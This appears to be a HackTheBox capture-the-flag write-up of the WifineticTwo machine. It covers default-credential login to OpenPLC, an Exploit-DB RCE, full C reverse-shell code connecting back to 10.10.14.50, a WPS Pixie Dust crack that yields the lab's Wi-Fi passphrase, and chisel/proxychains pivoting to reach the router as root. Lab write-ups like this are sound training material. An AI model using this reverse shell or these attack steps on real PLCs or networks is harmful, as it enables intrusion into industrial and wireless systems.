---
date: 2025-01-03
categories: [CTF, HTB]
title: "HTB - WifineticTwo"
tags: ['nmap', 'privilege escalation', 'rce','wireless', 'wifi', 'tryhackme', 'hackthebox', 'immersivelabs', 'thm', 'iml', 'htb']

description: "WifineticTwo - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# HTB - WifineticTwo

NMAP

![image1](../resources/d122496389fc4a679d5896361d3f7890.png)


![image2](../resources/d60fdd12b82142eeb977aa0862d1bae0.png)

- Using the default credentials for OpenPLC

**openplc : openplc**

- We can log in:

![image3](../resources/532da29d255b47c5807e4116f39e723b.png)

- I found this RCE vulnerability for openplc:
<https://www.exploit-db.com/exploits/49803>


![image4](../resources/f9282d034d574bf2a4e687ca094bf027.png)

It fails at the last hurdle

- It creates the file program.st:

![image5](../resources/27028cc04167442b8b5ff82d6db348a9.png)

- But the compilation of this program fails because it doesn't exist on the server


![image6](../resources/7abe9ad2cfe94206a0675948500ffebd.png)

- This is the C code that it creates:

```c
#include "ladder.h"

#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

//-----------------------------------------------------------------------------
//-----------------------------------------------------------------------------

int ignored_bool_inputs[] = {-1};
int ignored_bool_outputs[] = {-1};
int ignored_int_inputs[] = {-1};
int ignored_int_outputs[] = {-1};

//-----------------------------------------------------------------------------
//-----------------------------------------------------------------------------

void initCustomLayer()
{
}

void updateCustomIn()
{
}

void updateCustomOut()
{
    int port = 5555;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);

    revsockaddr.sin_family = AF_INET;
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("10.10.14.50");

    connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));

    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

    return 0;
}

```


- We are however, able to compile the Blank Program:

![image7](../resources/3fef8fd407f84a12a30b3a25179cdc93.png)

- Copy the code from program.st
- Delete the program.st and only have Blank Program there
- Go to Hardware -\> Check the reverse shell code is in there or paste it in
- Make sure it says Blank Program at the top:

![image8](../resources/c2edec513c414d1cb2fa4e6c138f3428.png)


![image9](../resources/aec49b185cf04ad9b2b5446814df90c5.png)

- Save changes

- Set up listener
- Start PLC

![image10](../resources/edd67a5bee7b4192bc2963b3c5d5f7b6.png)


![image11](../resources/2f12cd922a304b70b2f98a95263eb0a0.png)

- Root isn't ROOT:

![image12](../resources/59b8a1a22a5d461498c1d59c89fe828a.png)

- More stable shell:

```bash
/usr/bin/script -qc /bin/bash /dev/null

#PRESS Ctrl+Z

stty raw -echo
fg

#PRESS ENTER
#PRESS ENTER

export TERM=xterm
stty cols 236 rows 59
PS1="\n\[\033[1;34m\][\$(date +%H%M)][\u@\h:\w]$\[\033[0m\] "
alias ls='ls --color=auto'
reset
clear

#PRESS ENTER

```

![image13](../resources/ee16005120d842b8a7dffbef4c47160f.png)

```bash
sudo iwlist wlan0 scan

```

![image14](../resources/e81fa7acd0e0446b9b5a66b7ab603ac8.png)

```bash
iwconfig

```

![image15](../resources/562670a54c3f4e40bc338ced502f3643.png)

- From the outputs above, we can see that we have a wireless adapter **wlan0** and there is a wireless network called **plcrouter**. But we aren't connected to it

- First we need to find the passphrase for the network

- We can see if we can do a WPS Pixie Dust Attack:
  
```bash
git clone https://github.com/kimocoder/OneShot/tree/master

sudo python3 oneshot.py -i wlan0 -K

```

![image16](../resources/432417da8daa41a9b501adebffb72ebe.png)

- After cracking the WPS PIN, we get the PSK (password):
**NoWWEDoKnowWhaTisReal123!**

- We don't have Network Manager installed but we do have wpa_supplicant

- Follow this guide to connect to plcrouter using wpa_supplicant
<https://wiki.somlabs.com/index.php/Connecting_to_WiFi_network_using_systemd_and_wpa-supplicant>


![image17](../resources/f37d01c93d1340afb37c161337c25df9.png)


![image18](../resources/595d12becbe8483bbf8ae8b82da42f22.png)

- Connected:

![image19](../resources/fccbd04dc09e4ce39f140565c16ce115.png)

- Uploaded chisel to see if I can see any other machines on the network and got a hit on 192.168.1.1 on port 80:
  
```bash
chisel server -p 8888 --reverse
./chisel client 10.10.14.50:8888 R:socks
proxychains nmap 192.168.1.0/24 -sT

```

![image20](../resources/c0f218f6a1854eeda400aebd01436d32.png)

Most probably the router

Port 22 is also open on the router:


![image21](../resources/27f54e37ec8547f3acba7b88ef25c8f6.png)

- If we look at the http page (through FoxyProxy Chisel proxy):

![image22](../resources/1dc73282f87a45c09c86fb742d3a8e40.png)

- The username root is already populated and if we just click on Login:

![image23](../resources/fa23fefeb3e640f0acc94aad93c760ed.png)

We successfully log in

- We can use this to ssh to the access point:
  
```bash
ssh root@192.168.1.1
```

![image24](../resources/c761ddc1511e482aa3d8bab80d0c0e23.png)

If you want to install something like reaver for this challenge


![image25](../resources/2e9ea6d8110b489ead1e9771f0985479.png)


![image26](../resources/8018ddf2a6c443d1b546f3427c403a47.png)

Apt isn't configured to run through a SOCKS proxy (like chisel) but rather through an http proxy

The best way to get apt to run on a remote machine with no internet access is:

<u>On Kali:</u>

```bash
pip install proxy.py
proxy --hostname 0.0.0.0 --port 12345
```

<u>On remote target machine:</u>
- Create the file /etc/apt/apt.conf with the lines:

```bash
Acquire::http::Proxy "http://10.10.14.50:12345/";
Acquire::https::Proxy "https://10.10.14.50:12345/";
```
- And set the env_variable http_proxy:

```bash
export http_proxy=http://10.10.14.50:12345
```

- Now run apt commands:

![image27](../resources/dfdb290fffc24d7883aa54aa47c8a7e6.png)


![image28](../resources/631a9f3af6be436486467aa15ea54270.png)
